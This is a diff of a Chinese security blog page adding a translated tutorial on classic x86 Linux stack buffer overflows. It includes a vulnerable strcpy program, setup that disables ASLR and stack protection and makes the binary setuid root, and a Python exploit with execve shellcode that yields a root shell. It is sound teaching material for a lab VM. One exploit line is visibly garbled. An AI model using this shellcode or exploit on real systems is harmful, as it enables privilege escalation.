@@ -108,6 +108,112 @@
         
           <section id="main">
   
+    <article id="post-stackbufferflow"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161230/stackbufferflow/">经典栈缓冲区溢出</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161230/stackbufferflow/" class="article-date">
+	  <time datetime="2016-12-30T09:00:05.000Z" itemprop="datePublished">十二月 30, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://www.csyssec.org/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-经典栈缓冲区溢出</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是缓冲区溢出（Buffer Overflow）</li>
+<li>0X02 什么是任意代码执行（Arbitrary Code Execution）</li>
+<li>0X03 如何实现任意代码执行</li>
+</ul>
+</blockquote>
+<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
+<p>虽然你能在网上找到很多缓冲区溢出漏洞利用系列教程，但本文肯定是其中最最简单的一篇。尽管内容与其他文章多有重复，并且同类文章已经有了很多，我仍然愿意出一篇独家教程，因为这篇博文将是我后续发布的众多文章的阅读前提。</p>
+<h3 id="0X01-什么是缓冲区溢出（Buffer-Overflow）"><a href="#0X01-什么是缓冲区溢出（Buffer-Overflow）" class="headerlink" title="0X01 什么是缓冲区溢出（Buffer Overflow）"></a>0X01 什么是缓冲区溢出（Buffer Overflow）</h3><p>将源缓冲区复制到目标缓冲区时，以下情况可能导致缓冲区溢出的情况发生：</p>
+<ol>
+<li>源字符串长度大于目标字符串长度</li>
+<li>没有执行缓冲区大小检查</li>
+</ol>
+<p>缓冲区溢出分两类：</p>
+<ol>
+<li>栈缓冲区溢出——此时目标缓冲区存放于栈中</li>
+<li>堆缓冲区溢出——此时目标缓冲区存放于堆中</li>
+</ol>
+<p>这篇文章里，我只讨论栈缓冲区溢出问题。堆缓冲区溢出请参见<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux (x86) 漏洞利用教程系列</a>中的<a href="http://www.csyssec.org/20161230/linux-exploit/#堆漏洞" target="_blank" rel="external">第三部分</a>。</p>
+<p>缓冲区溢出漏洞会导致任意代码执行的发生。</p>
+<h3 id="0X02-什么是任意代码执行（arbitrary-code-execution）"><a href="#0X02-什么是任意代码执行（arbitrary-code-execution）" class="headerlink" title="0X02 什么是任意代码执行（arbitrary code execution）"></a>0X02 什么是任意代码执行（arbitrary code execution）</h3><p>任意代码执行允许攻击者执行代码来获得系统控制权。获得系统控制权的方法有很多，比如触发一个root shell、添加一个新用户、建立一个网络端口等等。</p>
+<p>听起来挺有趣的吧？话不多说，来看一则典型漏洞代码吧！</p>
+<p><u><em>漏洞代码：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u><em>编译命令：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -z execstack -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>上述漏洞程序的第[2]行显示，该程序中存在缓冲区溢出漏洞。由于缓冲区内容是用户提供的输入值，因此这个缓冲区溢出漏洞很可能导致系统执行任意代码。</p>
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<h3 id="0X03-如何实现任意代码执行是如何实现的"><a href="#0X03-如何实现任意代码执行是如何实现的" class="headerlink" title="0X03 如何实现任意代码执行是如何实现的"></a>0X03 如何实现任意代码执行是如何实现的</h3><p>任意代码执行是通过<strong>“返回地址覆盖(Return Address<br> Overwrite)”</strong>技术实现的。这种方法帮助攻击者覆盖掉存储在栈内的返回地址，通过这种覆盖，任意代码执行得以实现。</p>
+<p>为了让大家更好地理解漏洞利用代码，我们在对它做进一步的分析之前，先来反汇编并画出漏洞代码的堆栈布局图吧！</p>
+<p><u><em>反汇编：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">   <span class="comment">//Function Prologue</span></div><div class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	push   %ebp                      <span class="comment">//backup caller's ebp</span></div><div class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	mov    %esp,%ebp                 <span class="comment">//set callee's ebp to esp</span></div><div class="line"></div><div class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	and    $<span class="number">0xfffffff0</span>,%esp          <span class="comment">//stack alignment</span></div><div class="line">   <span class="number">0x0804841a</span> &lt;+<span class="number">6</span>&gt;:	sub    $<span class="number">0x110</span>,%esp               <span class="comment">//stack space for local variables</span></div><div class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	mov    <span class="number">0xc</span>(%ebp),%eax            <span class="comment">//eax = argv</span></div><div class="line">   <span class="number">0x08048423</span> &lt;+<span class="number">15</span>&gt;:	add    $<span class="number">0x4</span>,%eax                 <span class="comment">//eax = &amp;argv[1]</span></div><div class="line">   <span class="number">0x08048426</span> &lt;+<span class="number">18</span>&gt;:	mov    (%eax),%eax               <span class="comment">//eax = argv[1]</span></div><div class="line">   <span class="number">0x08048428</span> &lt;+<span class="number">20</span>&gt;:	mov    %eax,<span class="number">0x4</span>(%esp)            <span class="comment">//strcpy arg2 </span></div><div class="line">   <span class="number">0x0804842c</span> &lt;+<span class="number">24</span>&gt;:	lea    <span class="number">0x10</span>(%esp),%eax           <span class="comment">//eax = 'buf' </span></div><div class="line">   <span class="number">0x08048430</span> &lt;+<span class="number">28</span>&gt;:	mov    %eax,(%esp)               <span class="comment">//strcpy arg1</span></div><div class="line">   <span class="number">0x08048433</span> &lt;+<span class="number">31</span>&gt;:	call   <span class="number">0x8048330</span> &lt;<span class="built_in">strcpy</span>@plt&gt;    <span class="comment">//call strcpy</span></div><div class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">36</span>&gt;:	mov    $<span class="number">0x8048530</span>,%eax           <span class="comment">//eax = format str "Input:%s\n"</span></div><div class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	lea    <span class="number">0x10</span>(%esp),%edx           <span class="comment">//edx = buf</span></div><div class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	mov    %edx,<span class="number">0x4</span>(%esp)            <span class="comment">//printf arg2</span></div><div class="line">   <span class="number">0x08048445</span> &lt;+<span class="number">49</span>&gt;:	mov    %eax,(%esp)               <span class="comment">//printf arg1</span></div><div class="line">   <span class="number">0x08048448</span> &lt;+<span class="number">52</span>&gt;:	call   <span class="number">0x8048320</span> &lt;<span class="built_in">printf</span>@plt&gt;    <span class="comment">//call printf</span></div><div class="line">   <span class="number">0x0804844d</span> &lt;+<span class="number">57</span>&gt;:	mov    $<span class="number">0x0</span>,%eax                 <span class="comment">//return value 0</span></div><div class="line"></div><div class="line">   <span class="comment">//Function Epilogue</span></div><div class="line">   <span class="number">0x08048452</span> &lt;+<span class="number">62</span>&gt;:	leave                            <span class="comment">//mov ebp, esp; pop ebp; </span></div><div class="line">   <span class="number">0x08048453</span> &lt;+<span class="number">63</span>&gt;:	ret                              <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u><em>堆栈布局：</em></u></p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/level1stacklayout.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/level1stacklayout.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>根据已有知识，用户输入值大小超过256时会溢出目标缓冲区，并且覆盖存储于栈中的返回地址。让我们来通过发送一串“A”的方法进行测试。</p>
+<p>测试第一步： 是否会覆盖返回地址？</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*300'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*300'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果显示，EIP被“AAAAA”覆盖了，这就意味着返回地址被覆盖是有可能的!!</p>
+<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
+<p>现在我们来找找目标缓冲区‘buf’中返回地址的偏移处于什么位置。<br>之前我们已经反汇编并画了main()的堆栈布局，那么现在就试着找出代码的偏移位置信息吧！由堆栈布局可以看出，返回地址偏移位于目标缓冲区buf的(0x10c)处。(0x10c)计算方式如下</p>
+<pre><code>0X04 0x10c = 0x100 + 0x8 + 0x4
+</code></pre><p>其中：</p>
+<ul>
+<li>0X100 是‘buf’大小</li>
+<li>0x8 是对齐空间</li>
+<li>0x4 是调用者的EBP</li>
+</ul>
+<p>这样一来，用户输入“A” <em> 268 + “B” </em> 4中，一串“A”覆盖‘buf’、对齐空间和调用者的EBP，“BBBB”覆盖返回地址。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果表明攻击者已经获得返回地址的控制权。位于栈 (0xbffff1fc)的返回地址已经被“BBBB”覆盖了。有了这些信息，我们就可以写出能实现任意代码执行的漏洞利用代码了。</p>
+<p><u><em>漏洞利用代码：</em></u></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py </span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = <span class="number">0xbffff1d0</span>       </div><div class="line">              </div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numnk + RA + NOP's + Shellcode</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">100</span></div><div class="line">buf += scode</div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用程序就可以获取root shell，如下所示：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������<span class="number">1</span>�Ph<span class="comment">//shh/bin��P��S���</span></div><div class="line"></div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure></p>
+<p><u><em>注意：</em></u>为了得到这个root shell，我们舍弃了很多exploit的mitigation方法。其实在整个系列的<a href="http://www.csyssec.org/20161230/linux-exploit/#基本漏洞" target="_blank" rel="external">第一部分</a>，我都特意没用这些exploit的mitigation方法，因为level 1的目标，仅止于普及漏洞知识。如果你真的想学到有意思的知识，就去看<a href="http://www.csyssec.org/20161230/linux-exploit/" target="_blank" rel="external">Linux (x86)漏洞利用教程系列</a>的<a href="http://www.csyssec.org/20161230/linux-exploit/#绕过漏洞利用缓解-Exploit-Mitigation-技术" target="_blank" rel="external">第二部分</a>吧！到时候我会教你们如何绕过exploit的mitigation方法。</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-经典栈缓冲区溢出</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Overflow/">Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-linux-exploit"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -425,6 +531,18 @@ size:拥有在TOP4会议中发表论文的作者数量
               <div class="widget-entry-summary" style="margin: 0;">
             
 
+              <h6 style="margin: 0;"><a href="/20170224/migration/">云平台高可用之虚拟机迁移</a></h6>
+          <!--  <span>二月 24, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
               <h6 style="margin: 0;"><a href="/20170223/course-byoungyounglee1/">安全与可信系统</a></h6>
           <!--  <span>二月 23, 2017</span> -->
             </div>
@@ -599,18 +717,6 @@ size:拥有在TOP4会议中发表论文的作者数量
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-gotgor/">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a></h6>
-          <!--  <span>一月 2, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -621,7 +727,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a></li></ul>
     </div>
   </div>
 
@@ -631,7 +737,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 12.22px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Course/" style="font-size: 10px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.78px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 11.11px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.33px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 15.56px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 13.33px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11.11px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.11px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Professor/" style="font-size: 10px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 14.44px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 11.11px;">Stack</a> <a href="/tags/System/" style="font-size: 18.89px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12.22px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 16.67px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
+      <a href="/tags/ASLR/" style="font-size: 12.22px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Course/" style="font-size: 10px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.78px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 11.11px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.33px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 15.56px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 13.33px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11.11px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 11.11px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Professor/" style="font-size: 10px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 14.44px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 11.11px;">Stack</a> <a href="/tags/System/" style="font-size: 18.89px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12.22px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 16.67px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
     </div>
   </div>
 
